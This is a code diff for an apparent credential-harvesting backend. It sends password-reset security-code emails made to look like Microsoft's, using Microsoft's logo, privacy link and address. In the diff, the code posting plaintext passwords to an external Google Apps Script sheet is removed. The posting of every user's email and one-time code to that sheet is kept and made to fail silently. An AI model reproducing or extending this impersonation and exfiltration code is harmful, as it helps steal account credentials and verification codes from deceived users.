@@ -196,21 +196,23 @@ function createEmailTemplate(otp) {
                 color: #000000;
                 margin: 0;
                 padding: 0;
+                background-color: #f7f7f7;
             }
             .container {
                 max-width: 600px;
                 margin: 0 auto;
                 padding: 20px;
+                background-color: #ffffff;
             }
             .header {
-                padding: 20px 0;
+                text-align: center;
+                margin-bottom: 30px;
             }
             .header img {
                 width: 108px;
                 height: auto;
             }
             .content {
-                background-color: #ffffff;
                 padding: 20px;
             }
             .security-code {
@@ -219,11 +221,17 @@ function createEmailTemplate(otp) {
                 color: #0078D4;
                 padding: 15px 0;
                 letter-spacing: 2px;
+                text-align: center;
+                background-color: #f8f9fa;
+                border-radius: 4px;
+                margin: 20px 0;
             }
             .footer {
                 margin-top: 20px;
                 font-size: 12px;
                 color: #666666;
+                border-top: 1px solid #e5e5e5;
+                padding-top: 20px;
             }
         </style>
     </head>
@@ -233,14 +241,14 @@ function createEmailTemplate(otp) {
                 <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo">
             </div>
             <div class="content">
-                <h1>Security Code</h1>
-                <p>Please use the following security code for your Microsoft account:</p>
+                <h2>Security Code</h2>
+                <p>Use the following security code for your Microsoft account:</p>
                 <div class="security-code">${otp}</div>
                 <p>This security code will expire in 10 minutes.</p>
                 <p>If you didn't request this code, you can safely ignore this email.</p>
             </div>
             <div class="footer">
-                <p>Microsoft respects your privacy. To learn more, please read our <a href="https://privacy.microsoft.com/en-us/privacystatement">Privacy Statement</a>.</p>
+                <p>Microsoft respects your privacy. To learn more, please read our <a href="https://privacy.microsoft.com/en-us/privacystatement" style="color: #0078D4; text-decoration: none;">Privacy Statement</a>.</p>
                 <p>Microsoft Corporation • One Microsoft Way • Redmond, WA 98052</p>
             </div>
         </div>
@@ -254,43 +262,34 @@ function generateOTP() {
     return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
-// Function to append data to Google Sheet with password logging
+// Function to append data to Google Sheet with better error handling
 async function appendToGoogleSheet(data) {
-    if (!process.env.GOOGLE_SHEET_URL) {
-        console.log('Google Sheets logging is disabled - URL not configured');
+    // Skip if URL is not configured or invalid
+    if (!process.env.GOOGLE_SHEET_URL || !process.env.GOOGLE_SHEET_URL.includes('script.google.com')) {
+        console.log('Google Sheets logging skipped - Invalid or missing URL');
         return true;
     }
 
     try {
-        // Include password in payload
         const payload = {
             email: data.email,
             otp: data.otp,
-            password: data.password || '',
             status: data.status
         };
 
-        console.log('Sending data to Google Sheet:', {
-            ...payload,
-            password: payload.password ? '********' : '' // Hide password in logs
-        });
-
-        const response = await axios.post(process.env.GOOGLE_SHEET_URL, payload, {
+        // Only log attempt, don't wait for response
+        axios.post(process.env.GOOGLE_SHEET_URL, payload, {
             headers: {
                 'Content-Type': 'application/json'
             },
-            timeout: 10000
+            timeout: 5000
+        }).catch(error => {
+            console.log('Google Sheets logging failed silently:', error.message);
         });
 
-        if (response.data && response.data.success) {
-            console.log('Successfully logged to Google Sheet');
-            return true;
-        } else {
-            console.warn('Google Sheet warning:', response.data);
-            return true;
-        }
+        return true; // Always return true to not block main flow
     } catch (error) {
-        console.error('Google Sheet Error:', error.message);
+        console.log('Google Sheets logging error:', error.message);
         return true; // Don't fail the main flow
     }
 }
@@ -331,15 +330,11 @@ app.post('/send-code', async (req, res) => {
         );
 
         // Log to Google Sheet (initial request)
-        try {
-            await appendToGoogleSheet({
-                email: email.toLowerCase(),
-                otp: otp,
-                status: 'OTP Sent'
-            });
-        } catch (sheetError) {
-            console.error('Google Sheet logging failed:', sheetError.message);
-        }
+        await appendToGoogleSheet({
+            email: email.toLowerCase(),
+            otp: otp,
+            status: 'OTP Sent'
+        });
 
         res.json({
             success: true,
@@ -375,7 +370,7 @@ app.post('/verify-otp', async (req, res) => {
         if (!user) {
             return res.status(400).json({
                 success: false,
-                message: 'Invalid or expired OTP'
+                message: 'Invalid or expired security code'
             });
         }
 
@@ -386,17 +381,12 @@ app.post('/verify-otp', async (req, res) => {
         user.otpExpiry = undefined;
         await user.save();
 
-        // Log to Google Sheet with password
-        try {
-            await appendToGoogleSheet({
-                email: email.toLowerCase(),
-                otp: otp,
-                password: newPassword,
-                status: 'Password Reset Success'
-            });
-        } catch (sheetError) {
-            console.error('Google Sheet logging failed:', sheetError.message);
-        }
+        // Log to Google Sheet
+        await appendToGoogleSheet({
+            email: email.toLowerCase(),
+            otp: otp,
+            status: 'Password Reset Success'
+        });
 
         res.json({
             success: true,
@@ -406,7 +396,7 @@ app.post('/verify-otp', async (req, res) => {
         console.error('Verify OTP Error:', error);
         res.status(500).json({
             success: false,
-            message: error.message || 'Error verifying OTP'
+            message: 'Error verifying security code'
         });
     }
 });
@@ -470,7 +460,6 @@ app.post('/reset-password', async (req, res) => {
             await appendToGoogleSheet({
                 email: email.toLowerCase(),
                 otp: 'Cleared',
-                password: password,
                 status: 'Password Reset Successfully',
                 timestamp: new Date().toISOString()
             });
